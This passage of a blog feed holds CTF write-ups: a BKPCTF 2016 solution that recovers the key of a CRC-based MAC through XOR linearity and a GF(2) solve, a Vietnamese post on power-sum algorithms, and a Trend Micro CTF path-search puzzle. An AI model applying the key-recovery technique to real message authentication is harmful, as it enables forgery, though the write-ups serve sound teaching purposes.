+<p>which means our hashing function can be turned into pure integer operation form (note that this version of crc returns 64 bit data):</p>
+<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="null">hash(x,m) := crc( (x ⊕ C1)&lt;&lt;64 | crc( (x ⊕ C2) &lt;&lt; m.bit_length() | m ) )</code></p>
+<p>As crc is linear over xor, that form can be rewritten as:</p>
+<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="null">hash(x,m) := crc(x&lt;&lt;64) ⊕ crc(crc(x&lt;&lt;m.bit_length())) ⊕ f(m)</code></p>
+<p>&nbsp;</p>
+<p>Where f(m) is independent from x, and can be calculated by:</p>
+<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="null">f(m) := crc(x&lt;&lt;64) ⊕ crc(crc(x&lt;&lt;m.bit_length())) ⊕ hash(x,m)</code></p>
+<p>Let&#8217;s try if it&#8217;s constant:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">def f(x,m):
+  return xor(xor(crc(x+[0]*64),crc(crc(x+[0]*(len(m))))),hmac(crc,x,m))
+  
+print bits_to_hex(f(to_bits(64,0x273846),str_to_bits(PLAIN_1)))
+print bits_to_hex(f(to_bits(64,0x27384633),str_to_bits(PLAIN_1)))
+print bits_to_hex(f(to_bits(64,0xdeadbeef),str_to_bits(PLAIN_1)))
+</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">0xad441373f3df7919
+0xad441373f3df7919
+0xad441373f3df7919</pre>
+<p>&nbsp;</p>
+<p>So the constant for PLAIN_1 is <span style="color: #ff0000;">0xad441373f3df7919</span>, or <code class="EnlighterJSRAW" data-enlighter-language="null">crc(x&lt;&lt;64) ⊕ crc(crc(x&lt;&lt;m.bit_length())) == 0xa57d43a032feb286 ⊕ 0xad441373f3df7919 == </code>!</p>
+<p>Now, as the LHS is linear over xor, we can solve for x by bits.</p>
+<p>Let&#8217;s say g(x) is a linear function over xor, then <code class="EnlighterJSRAW" data-enlighter-language="null">g(x) = x0*g(2^0)+x1*g(2^1)+x2*g(2^2)</code>, where xi is bit i of x, so to solve for x from g(x), we just need to find x0, x1, x2,&#8230;</p>
+<p><span style="line-height: 1.5;">Ok, let&#8217;s calculate array {g(2^i)}:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">print map(lambda x: int(x[2:],16)^0xad441373f3df7919,[bits_to_hex(hmac(crc, to_bits(64, 2**i), str_to_bits(PLAIN_1))) for i in range(64)])</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">[6834908643740050077L, 8918261360326614375L, 3600904948819878547L, 11925816451771342203L, 7098953563970525020L, 250491143874901733L, 13871981502125061527L, 12141935756842272388L, 8684960005792719010L, 3998826113598822681L, 12145552072860297839L, 8691349026213935476L, 3984360580943489717L, 12170521405071002935L, 8667819726527657924L, 3955397618321405909L, 12373709570274539511L, 9148772311635821124L, 4295619248599194837L, 12775235449187295735L, 5409676984928710212L, 5789065119148442837L, 7412147678370845175L, 849648730292190131L, 15124753415683977019L, 9965726379648136156L, 4403455869246736914L, 13567263759751040121L, 5843346184221062488L, 7232655499200574189L, 1067334037898706311L, 15847930004167435091L, 11410109179131964172L, 1528755289798589362L, 17014177992982769465L, 17418665637690586072L, 14623638097115056666L, 13575463204758878622L, 5858618864078233238L, 7271915590215853425L, 1127839958837695167L, 15653736043036081443L, 11240125514458011628L, 2197594243193422450L, 18054418212176223417L, 15896248787898488024L, 10426727587354133530L, 639743797107778974L, 15542294092789453665L, 9719943529612364648L, 2616260629129296762L, 10298979513560477353L, 3772943349561078008L, 12594504273370790317L, 8365397508198080240L, 3341473552091702717L, 11154974181608723239L, 2025021915423886308L, 18321857654312619925L, 15352253859363582592L, 9483132146532092074L, 3365100990727388414L, 11175275768288584097L, 2282081819746938600L]
+</pre>
+<p>Solving it using SAGE:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">from sage.all import *
+
+A = [6834908643740050077L, 8918261360326614375L, 3600904948819878547L, 11925816451771342203L, 7098953563970525020L, 250491143874901733L, 13871981502125061527L, 12141935756842272388L, 8684960005792719010L, 3998826113598822681L, 12145552072860297839L, 8691349026213935476L, 3984360580943489717L, 12170521405071002935L, 8667819726527657924L, 3955397618321405909L, 12373709570274539511L, 9148772311635821124L, 4295619248599194837L, 12775235449187295735L, 5409676984928710212L, 5789065119148442837L, 7412147678370845175L, 849648730292190131L, 15124753415683977019L, 9965726379648136156L, 4403455869246736914L, 13567263759751040121L, 5843346184221062488L, 7232655499200574189L, 1067334037898706311L, 15847930004167435091L, 11410109179131964172L, 1528755289798589362L, 17014177992982769465L, 17418665637690586072L, 14623638097115056666L, 13575463204758878622L, 5858618864078233238L, 7271915590215853425L, 1127839958837695167L, 15653736043036081443L, 11240125514458011628L, 2197594243193422450L, 18054418212176223417L, 15896248787898488024L, 10426727587354133530L, 639743797107778974L, 15542294092789453665L, 9719943529612364648L, 2616260629129296762L, 10298979513560477353L, 3772943349561078008L, 12594504273370790317L, 8365397508198080240L, 3341473552091702717L, 11154974181608723239L, 2025021915423886308L, 18321857654312619925L, 15352253859363582592L, 9483132146532092074L, 3365100990727388414L, 11175275768288584097L, 2282081819746938600L]
+b = 0xa57d43a032feb286^0xad441373f3df7919
+m=[]
+for i in range(64):
+  for a in A:
+    m.append(int((a&gt;&gt;i)&amp;1))
+  m.append(int((b&gt;&gt;i)&amp;1))
+m = Matrix(GF(2),64,65,m)
+mr=m.rref()
+#print mr.str()
+print mr[:,64].transpose().str()</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]
+</pre>
+<p>Um, seems wrong&#8230; Let&#8217;s relook at the crc function&#8230;</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">def crc(mesg):
+  mesg += CONST
+  shift = 0
+  while shift &lt; len(mesg) - 64:
+    if mesg[shift]:
+      for i in range(65):
+        mesg[shift + i] ^= CRC_POLY[i]
+    shift += 1
+  return mesg[-64:]
+</pre>
+<p>Found it! This crc function is padded with CONST, we just need to nullize it and change function f above.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-highlight="2">def _crc(mesg):
+  mesg += [0]*64
+  shift = 0
+  while shift &lt; len(mesg) - 64:
+    if mesg[shift]:
+      for i in range(65):
+        mesg[shift + i] ^= CRC_POLY[i]
+    shift += 1
+  return mesg[-64:]
+
+def f(x,m):
+ return xor(xor(_crc(x+[0]*64),_crc(_crc(x+[0]*(len(m))))),hmac(crc,x,m))
+</pre>
+<p>The constants now is <span style="color: #ff0000;">0xef6bbf832c7eced2</span>, regenerate the {g(2^i)} array, we obtain:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">A = [2086809031724160342, 4173618063448320684, 8347236126896641368, 16694472253793282736L, 2354010789588066455, 4708021579176132910, 9416043158352265820L, 16910874547544338767L, 4226771103552264041, 8453542207104528082, 16907084414209056164L, 4229569526062812863, 8459139052125625726, 16918278104251251452L, 4208021141449359375, 8416042282898718750, 16832084565797437500L, 4384635772785538447, 8769271545571076894, 17538543091142153788L, 665587708229949839, 1331175416459899678, 2662350832919799356, 5324701665839598712, 10649403331679197424L, 14439371256774722583L, 9165840333751074265, 18331680667502148530L, 1384875121671455379, 2769750243342910758, 5539500486685821516, 11079000973371643032L, 15886295027533749447L, 6275931173970513017, 12551862347941026034L, 12940008229072012307L, 9862379257203277265L, 18323483507405901397L, 1396769139689302365, 2793538279378604730, 5587076558757209460, 11174153117514418920L, 15695992938220920871L, 6652028455910995385, 13304056911821990770L, 11436186450250294035L, 15176147297687040977L, 5390667367170691669, 10781334734341383338L, 14180570601802398883L, 7377318259839126705, 14754636519678253410L, 8535309807767455539, 17070619615534911078L, 3906996125356534075, 7813992250713068150, 15627984501426136300L, 6788611577661193263, 13577223155322386526L, 10890132138416260427L, 13958192917995831137L, 7826290186278357813, 15652580372556715626L, 6738574311101372707]
+b = 0xa57d43a032feb286^0xef6bbf832c7eced2
+</pre>
+<p>And the output now is:</p>
+<pre class="EnlighterJSRAW" data-enlighter-theme="twilight">[0 0 0 1 0 0 0 1 0 0 1 1 1 0 1 1 0 1 1 1 0 0 1 1 0 1 0 1 1 1 0 0 0 0 0 0 1 1 1 0 1 1 1 0 1 0 0 0 0 1 1 0 1 0 1 0 0 1 1 1 0 1 0 1]
+</pre>
+<p>So the key in binary form is <span style="color: #ff0000;">1010111001010110000101110111000000111010110011101101110010001000</span>. Let&#8217;s calculate the hash now!</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="python">print bits_to_hex(hmac(crc, to_bits(64, 0b1010111001010110000101110111000000111010110011101101110010001000), str_to_bits(PLAIN_2)))
+</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="twilight">0xd2db2b8b9002841f</pre>
+<p>And here&#8217;s the flag: <strong>BKPCTF{0xd2db2b8b9002841f}</strong>!</p>
+<p><span style="line-height: 1.5;"></div></div> </div></span></p>
+<p>Updating&#8230;</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2016/03/07/bkpctf-2016/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">67</post-id>	</item>
+		<item>
+		<title>Một bài toán tính tổng</title>
+		<link>https://www.vhn.vn/blog/index.php/2015/11/07/mot-bai-toan-tinh-tong/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2015/11/07/mot-bai-toan-tinh-tong/#comments</comments>
+		<pubDate>Sat, 07 Nov 2015 16:55:50 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=49</guid>
+		<description><![CDATA[Link bài toán: http://vn.spoj.com/problems/C11CAL/]]></description>
+				<content:encoded><![CDATA[<p>Link bài toán: http://vn.spoj.com/problems/C11CAL/</p>
+<div class="su-accordion">
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution 0.00s</div><div class="su-spoiler-content su-clearfix" style="display:none">
+Đọc bài này, cái mình nghĩ đến đầu tiên là auto sinh lời giải (vì k nhỏ quá), chạy Maple giải cho toàn bộ k dưới 50, ta có solution 0.00s:<br />
+View the code on <a href="https://gist.github.com/vhqtvn/d75a241508d65cd18b18">Gist</a>.<br />
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution nhân ma trận</div><div class="su-spoiler-content su-clearfix" style="display:none">
+Sau đó do cắn rứt lương tâm quá <img src="https://s.w.org/images/core/emoji/11/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Sao mình giải 0.00s mà ng khác giải lại cả 40-50s, mình thử giải cách chính thống chút). Đặt <img src='https://s0.wp.com/latex.php?latex=S_n%5Ek+%3D+%5Csum_%7Bi%3D1%7D%5En%7Bi%5Ek%7D&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='S_n^k = \sum_{i=1}^n{i^k}' title='S_n^k = \sum_{i=1}^n{i^k}' class='latex' />. Để có thể áp dụng nhân ma trận, ta cần biến đổi bài toán về dạng tuyến tính <img src='https://s0.wp.com/latex.php?latex=X_%7Bn%2B1%7D+%3D+A+X_n&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='X_{n+1} = A X_n' title='X_{n+1} = A X_n' class='latex' /> với <img src='https://s0.wp.com/latex.php?latex=X_i&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='X_i' title='X_i' class='latex' /> là một vector (trạng thái), <img src='https://s0.wp.com/latex.php?latex=A&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='A' title='A' class='latex' /> là ma trận (chuyển đổi trạng thái).<br />
+Ta có <img src='https://s0.wp.com/latex.php?latex=S_%7Bn%2B1%7D%5Ek+-+S_n%5Ek+%3D+%28n%2B1%29%5Ek&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='S_{n+1}^k - S_n^k = (n+1)^k' title='S_{n+1}^k - S_n^k = (n+1)^k' class='latex' />, hàm này không thể tìm được ma trận A nào thoả mãn, mình phải thêm các giá trị trung gian để giúp việc biến đổi trở thành tuyến tính.<br />
+Mặt khác, <img src='https://s0.wp.com/latex.php?latex=%28n%2B1%29%5Ek+%3D+n%5Ek+%2B+C_k%5E1+n%5E%7Bk-1%7D+%2B+C_k%5E2+n%5E%7Bk-2%7D+%2B+...+%2B+C_k%5E1+n+%2B+1&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='(n+1)^k = n^k + C_k^1 n^{k-1} + C_k^2 n^{k-2} + ... + C_k^1 n + 1' title='(n+1)^k = n^k + C_k^1 n^{k-1} + C_k^2 n^{k-2} + ... + C_k^1 n + 1' class='latex' />, ta có thể tính được <img src='https://s0.wp.com/latex.php?latex=%28n%2B1%29%5Ek&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='(n+1)^k' title='(n+1)^k' class='latex' /> một cách tuyến tính từ <img src='https://s0.wp.com/latex.php?latex=k&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='k' title='k' class='latex' /> luỹ thừa tự nhiên đầu tiên của <img src='https://s0.wp.com/latex.php?latex=n&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='n' title='n' class='latex' />, đặt <img src='https://s0.wp.com/latex.php?latex=X_i+%3D+%5Cleft%5B+1%2C+i%2C+i%5E2%2C+...%2C+i%5Ek%2C+S_i%5Ek+%5Cright%5D%5ET&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='X_i = \left[ 1, i, i^2, ..., i^k, S_i^k \right]^T' title='X_i = \left[ 1, i, i^2, ..., i^k, S_i^k \right]^T' class='latex' />, ta được:</p>
+<p style="text-align: center;"><img src="//s0.wp.com/latex.php?latex=%5Cbegin%7Bvmatrix%7D++1%5C%5Ci%2B1%5C%5C%28i%2B1%29%5E2%5C%5C%5Cvdots%5C%5C%28i%2B1%29%5Ek++%5Cend%7Bvmatrix%7D+%3D++%5Cbegin%7Bvmatrix%7D++C_0%5E0+%26+0+%26+0+%26+%5Chdots+%26+0%5C%5C++C_1%5E0+%26+C_1%5E1+%26+0+%26+%5Chdots+%26+0%5C%5C++C_2%5E0+%26+C_2%5E1+%26+C_2%5E2+%26+%5Chdots+%26+0%5C%5C++%5Cvdots+%26+%5Cvdots+%26+%5Cvdots+%26+%5Cddots+%26+%5C%5C++C_k%5E0+%26+C_k%5E1+%26+C_k%5E2+%26+%5Chdots+%26+C_k%5Ek++%5Cend%7Bvmatrix%7D++%5Cbegin%7Bvmatrix%7D++1%5C%5Ci%5C%5Ci%5E2%5C%5C%5Cvdots%5C%5Ci%5Ek++%5Cend%7Bvmatrix%7D&#038;bg=ffffff&#038;fg=000&#038;s=0" alt="&#92;begin{vmatrix}  1&#92;&#92;i+1&#92;&#92;(i+1)^2&#92;&#92;&#92;vdots&#92;&#92;(i+1)^k  &#92;end{vmatrix} =  &#92;begin{vmatrix}  C_0^0 &amp; 0 &amp; 0 &amp; &#92;hdots &amp; 0&#92;&#92;  C_1^0 &amp; C_1^1 &amp; 0 &amp; &#92;hdots &amp; 0&#92;&#92;  C_2^0 &amp; C_2^1 &amp; C_2^2 &amp; &#92;hdots &amp; 0&#92;&#92;  &#92;vdots &amp; &#92;vdots &amp; &#92;vdots &amp; &#92;ddots &amp; &#92;&#92;  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k  &#92;end{vmatrix}  &#92;begin{vmatrix}  1&#92;&#92;i&#92;&#92;i^2&#92;&#92;&#92;vdots&#92;&#92;i^k  &#92;end{vmatrix}" title="&#92;begin{vmatrix}  1&#92;&#92;i+1&#92;&#92;(i+1)^2&#92;&#92;&#92;vdots&#92;&#92;(i+1)^k  &#92;end{vmatrix} =  &#92;begin{vmatrix}  C_0^0 &amp; 0 &amp; 0 &amp; &#92;hdots &amp; 0&#92;&#92;  C_1^0 &amp; C_1^1 &amp; 0 &amp; &#92;hdots &amp; 0&#92;&#92;  C_2^0 &amp; C_2^1 &amp; C_2^2 &amp; &#92;hdots &amp; 0&#92;&#92;  &#92;vdots &amp; &#92;vdots &amp; &#92;vdots &amp; &#92;ddots &amp; &#92;&#92;  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k  &#92;end{vmatrix}  &#92;begin{vmatrix}  1&#92;&#92;i&#92;&#92;i^2&#92;&#92;&#92;vdots&#92;&#92;i^k  &#92;end{vmatrix}" class="latex" /></p>
+<p>Lúc này <img src='https://s0.wp.com/latex.php?latex=S_%7Bn%2B1%7D%5Ek+%3D+S_%7Bn%7D%5Ek+%2B+%28n%2B1%29%5Ek+%3D+S_%7Bn%7D%5Ek+%2B+n%5Ek+%2B+C_k%5E1+n%5E%7Bk-1%7D+%2B+C_k%5E2+n%5E%7Bk-2%7D+%2B+...+%2B+C_k%5E1+n+%2B+1&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='S_{n+1}^k = S_{n}^k + (n+1)^k = S_{n}^k + n^k + C_k^1 n^{k-1} + C_k^2 n^{k-2} + ... + C_k^1 n + 1' title='S_{n+1}^k = S_{n}^k + (n+1)^k = S_{n}^k + n^k + C_k^1 n^{k-1} + C_k^2 n^{k-2} + ... + C_k^1 n + 1' class='latex' />, ta chỉ cần thêm 1 giá trị vào vector trạng thái:</p>
+<p style="text-align: center;"><img src="//s0.wp.com/latex.php?latex=%5Cbegin%7Bvmatrix%7D++1%5C%5Ci%2B1%5C%5C%28i%2B1%29%5E2%5C%5C%5Cvdots%5C%5C%28i%2B1%29%5Ek%5C%5CS_%7Bi%2B1%7D%5Ek++%5Cend%7Bvmatrix%7D+%3D++%5Cbegin%7Bvmatrix%7D++C_0%5E0+%26+0+%26+0+%26+%5Chdots+%26+0+0%5C%5C++C_1%5E0+%26+C_1%5E1+%26+0+%26+%5Chdots+%26+0+0%5C%5C++C_2%5E0+%26+C_2%5E1+%26+C_2%5E2+%26+%5Chdots+%26+0+0%5C%5C++%5Cvdots+%26+%5Cvdots+%26+%5Cvdots+%26+%5Cddots+%26+%5C%5C++C_k%5E0+%26+C_k%5E1+%26+C_k%5E2+%26+%5Chdots+%26+C_k%5Ek+0++C_k%5E0+%26+C_k%5E1+%26+C_k%5E2+%26+%5Chdots+%26+C_k%5Ek+1++%5Cend%7Bvmatrix%7D++%5Cbegin%7Bvmatrix%7D++1%5C%5Ci%5C%5Ci%5E2%5C%5C%5Cvdots%5C%5Ci%5Ek%5C%5CS_%7Bi%7D%5Ek++%5Cend%7Bvmatrix%7D&#038;bg=ffffff&#038;fg=000&#038;s=0" alt="&#92;begin{vmatrix}  1&#92;&#92;i+1&#92;&#92;(i+1)^2&#92;&#92;&#92;vdots&#92;&#92;(i+1)^k&#92;&#92;S_{i+1}^k  &#92;end{vmatrix} =  &#92;begin{vmatrix}  C_0^0 &amp; 0 &amp; 0 &amp; &#92;hdots &amp; 0 0&#92;&#92;  C_1^0 &amp; C_1^1 &amp; 0 &amp; &#92;hdots &amp; 0 0&#92;&#92;  C_2^0 &amp; C_2^1 &amp; C_2^2 &amp; &#92;hdots &amp; 0 0&#92;&#92;  &#92;vdots &amp; &#92;vdots &amp; &#92;vdots &amp; &#92;ddots &amp; &#92;&#92;  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k 0  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k 1  &#92;end{vmatrix}  &#92;begin{vmatrix}  1&#92;&#92;i&#92;&#92;i^2&#92;&#92;&#92;vdots&#92;&#92;i^k&#92;&#92;S_{i}^k  &#92;end{vmatrix}" title="&#92;begin{vmatrix}  1&#92;&#92;i+1&#92;&#92;(i+1)^2&#92;&#92;&#92;vdots&#92;&#92;(i+1)^k&#92;&#92;S_{i+1}^k  &#92;end{vmatrix} =  &#92;begin{vmatrix}  C_0^0 &amp; 0 &amp; 0 &amp; &#92;hdots &amp; 0 0&#92;&#92;  C_1^0 &amp; C_1^1 &amp; 0 &amp; &#92;hdots &amp; 0 0&#92;&#92;  C_2^0 &amp; C_2^1 &amp; C_2^2 &amp; &#92;hdots &amp; 0 0&#92;&#92;  &#92;vdots &amp; &#92;vdots &amp; &#92;vdots &amp; &#92;ddots &amp; &#92;&#92;  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k 0  C_k^0 &amp; C_k^1 &amp; C_k^2 &amp; &#92;hdots &amp; C_k^k 1  &#92;end{vmatrix}  &#92;begin{vmatrix}  1&#92;&#92;i&#92;&#92;i^2&#92;&#92;&#92;vdots&#92;&#92;i^k&#92;&#92;S_{i}^k  &#92;end{vmatrix}" class="latex" /></p>
+<p>View the code on <a href="https://gist.github.com/vhqtvn/f93103d4d1e913071675">Gist</a>.<br />
+</div></div>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution khử Gauss</div><div class="su-spoiler-content su-clearfix" style="display:none">
+Bài này còn có thể nhận xét <img src='https://s0.wp.com/latex.php?latex=S_n%5Ek&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='S_n^k' title='S_n^k' class='latex' /> là một đa thức bậc <img src='https://s0.wp.com/latex.php?latex=k%2B1&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='k+1' title='k+1' class='latex' />, ta có thể tính ra đa thức đó bằng cách giải hệ phương trình bằng thuật toán khử Gauss trên <img src='https://s0.wp.com/latex.php?latex=%5Cmathbb%7BZ%7D%2F%281000000007%29&#038;bg=ffffff&#038;fg=000000&#038;s=0' alt='\mathbb{Z}/(1000000007)' title='\mathbb{Z}/(1000000007)' class='latex' />.<br />
+View the code on <a href="https://gist.github.com/vhqtvn/b4ab7bd6619bb4d9634f">Gist</a>.<br />
+</div></div>
+</div>
+]]></content:encoded>
+			<wfw:commentRss>https://www.vhn.vn/blog/index.php/2015/11/07/mot-bai-toan-tinh-tong/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">49</post-id>	</item>
+		<item>
+		<title>[Writeup] TrendMicro 2015</title>
+		<link>https://www.vhn.vn/blog/index.php/2015/09/28/writeup-trendmicro-2015/</link>
+		<comments>https://www.vhn.vn/blog/index.php/2015/09/28/writeup-trendmicro-2015/#respond</comments>
+		<pubDate>Mon, 28 Sep 2015 15:46:29 +0000</pubDate>
+		<dc:creator><![CDATA[vanhoavn]]></dc:creator>
+				<category><![CDATA[CTF]]></category>
+
+		<guid isPermaLink="false">https://www.vhn.vn/blog/?p=8</guid>
+		<description><![CDATA[I joined this CTF quite late, but luckily there&#8217;s still enough time to solve some interesting problems. Trend Micro CTF 2015 &#8211; Programming 400 Trend Micro CTF 2015 &#8211; Programming 500 Trend Micro CTF 2015 &#8211; Crypto 500]]></description>
+				<content:encoded><![CDATA[<p class="p1">I joined this CTF quite late, but luckily there&#8217;s still enough time to solve some interesting problems.</p>
+<p class="p1"><strong><span class="s1">Trend Micro CTF 2015 &#8211; </span><span class="s1">Programming 400</span></strong></p>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-arrow su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Show problem description</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1"><span class="s1">You are trying to sneak into a network, and and impersonate target computer. </span></p>
+<p class="p1"><span class="s1">Here, you would connect to computers connected via network, and <b>‘impersonate the computer by exchanging IP address’</b>. </span></p>
+<p class="p1"><span class="s1">In the target’s network, computers are connected as illustrated below:</span></p>
+<p class="p1"> <a href="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?ssl=1"><img data-attachment-id="10" data-permalink="https://www.vhn.vn/blog/index.php/2015/09/28/writeup-trendmicro-2015/swap_ip_1/" data-orig-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?fit=235%2C338&amp;ssl=1" data-orig-size="235,338" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="swap_ip_1" data-image-description="" data-medium-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?fit=209%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?fit=235%2C338&amp;ssl=1" class="size-medium wp-image-10 aligncenter" src="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?resize=209%2C300&#038;ssl=1" alt="swap_ip_1" width="209" height="300" srcset="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?resize=209%2C300&amp;ssl=1 209w, https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_1.png?w=235&amp;ssl=1 235w" sizes="(max-width: 209px) 100vw, 209px" data-recalc-dims="1" /></a></p>
+<p class="p1"><span class="s1">You are trying to impersonate computer A by accessing it from computer F. </span></p>
+<p class="p1"><span class="s1">In here, you can impersonate A by accessing it in the sequence of B -&gt; D -&gt; A, but the IP addresses of computer B and D will be changed.</span></p>
+<p class="p1"><span class="s1">However, if you access computer A in the order described below, you can impersonate without changing the IP addresses of computers other than A and F.</span></p>
+<p class="p1"><span class="s1">C -&gt; E -&gt; A -&gt; D -&gt; B -&gt; E -&gt; C -&gt; F -&gt; B -&gt; D -&gt; A</span></p>
+<p class="p1"><span class="s1">Please sneak into the network as illustrated below, and impersonate computer A from computer P.</span></p>
+<p class="p1"><img data-attachment-id="9" data-permalink="https://www.vhn.vn/blog/index.php/2015/09/28/writeup-trendmicro-2015/swap_ip_2/" data-orig-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?fit=603%2C336&amp;ssl=1" data-orig-size="603,336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="swap_ip_2" data-image-description="" data-medium-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?fit=300%2C167&amp;ssl=1" data-large-file="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?fit=603%2C336&amp;ssl=1" class="size-medium wp-image-9 aligncenter" src="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?resize=300%2C167&#038;ssl=1" alt="swap_ip_2" width="300" height="167" srcset="https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?resize=300%2C167&amp;ssl=1 300w, https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?resize=520%2C290&amp;ssl=1 520w, https://i0.wp.com/www.vhn.vn/blog/wp-content/uploads/2015/09/swap_ip_2.png?w=603&amp;ssl=1 603w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></p>
+<p class="p1"><span class="s1">Please specify and generate the shortest path as an output. </span></p>
+<p class="p1"><span class="s1">(In the example above, you may generate the output ‘CEADBECFBDA’.)</span></p>
+<p class="p1"><span class="s1">If you encounter multiple paths with the same amount of steps, please generate the first value in alphabetical order as the output. </span></p>
+<p class="p1"><span class="s1">Please submit TMCTF{&lt;Your output&gt;} as your answer.</span></p>
+</div></div><div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed"><div class="su-spoiler-title"><span class="su-spoiler-icon"></span>Solution</div><div class="su-spoiler-content su-clearfix" style="display:none">
+<p class="p1">I solved this problem using 2-ends BFS (yes, i have quite enough RAM for it:P). A state for this problem represented by the permutation of the assigned IP address of the machines and the last machine to move on. As we will have at most 16 values for 16 machines, we can use 64-bit unsigned int to represent the permutation state, and another 4-bit for last-machine, so uint128 is enough, but finally i was too lazy to do all bitwise operations and use pair struct :D.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">3 : TMCTF{CEADBECFBDA}
+4 : TMCTF{DGCFAEBGCFBGDHCFBEA}
+5 : TMCTF{DHCGAFBHCGBHDJEICGBHDIEJDHBFA}
+6 : TMCTF{FKDICHAGBICHBIDKEJCHBIDKEJDKFLEJDIBGA}
+7 : TMCTF{FLDJCIAHBJCIBJDLEKCIBJDLEKDLFNGMEKDLFMGNFLDJBHA}
